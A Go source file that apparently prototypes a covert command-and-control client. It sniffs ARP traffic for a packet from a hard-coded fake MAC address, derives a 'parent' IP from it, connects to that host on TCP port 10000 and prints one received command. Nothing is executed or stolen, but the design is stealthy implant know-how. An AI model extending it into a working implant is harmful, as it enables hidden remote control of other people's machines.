package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"reflect"
	"strconv"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	device       string = "\\Device\\NPF_{6D64678B-2267-4669-938F-1243F92A1F64}"
	snapshot_len int32  = 1024
	promiscuous  bool   = false
	err          error
	timeout      time.Duration = 5 * time.Second
	handle       *pcap.Handle
)

func main() {
	// Open device
	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Set filter
	var filter string = "arp"
	err = handle.SetBPFFilter(filter)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("Only capturing ARP")

	foundIP := false
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	var parentIP []uint8
	parentMAC := net.HardwareAddr{0xBB, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB}

	for packet := range packetSource.Packets() {
		if foundIP == true {
			break
		}
		// Do something with a packet here.
		// fmt.Println(packet)
		// packet.Layer(layers.LayerTypeTCP)
		// tcp, _ := packet.(*layers.TCP)
		// fmt.Printf("From src port %d to dst port %d\n", tcp.SrcPort, tcp.DstPort)
		if ethLayer := packet.Layer(layers.LayerTypeEthernet); ethLayer != nil {
			eth, _ := ethLayer.(*layers.Ethernet)
			if string(eth.SrcMAC) == string(parentMAC) {
				fmt.Println("Detected Fake MAC, getting Parent IP")
				// fmt.Println("FOUND PARENT MAC: ", eth.SrcMAC)
				if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
					arp, _ := arpLayer.(*layers.ARP)
					fmt.Println(reflect.TypeOf(arp.DstProtAddress))
					// fmt.Printf("From Arp Parent ADDRESS %d", arp.DstProtAddress)
					parentIP = arp.DstProtAddress
					foundIP = true
					break
				}
			}

		}
	}

	// ?fmt.Printf(string(parentIP[0]))
	parentIP2String := strconv.Itoa(int((parentIP[0]))) + "." + strconv.Itoa(int((parentIP[1]))) + "." + strconv.Itoa(int((parentIP[2]))) + "." + strconv.Itoa(int((parentIP[3])))
	fmt.Println(parentIP2String)
	// fmt.Println(strconv.Itoa(int((parentIP[0]))))

	//connect to parent

	fmt.Println("attempting to connect to parent")
	// CONNECT := arguments[1]
	c, err := net.Dial("tcp", parentIP2String+":"+"10000")
	if err != nil {
		fmt.Println(err)
		return
	}
	commandString, _ := bufio.NewReader(c).ReadString('\n')
	fmt.Print("Command Received->: " + commandString)
}
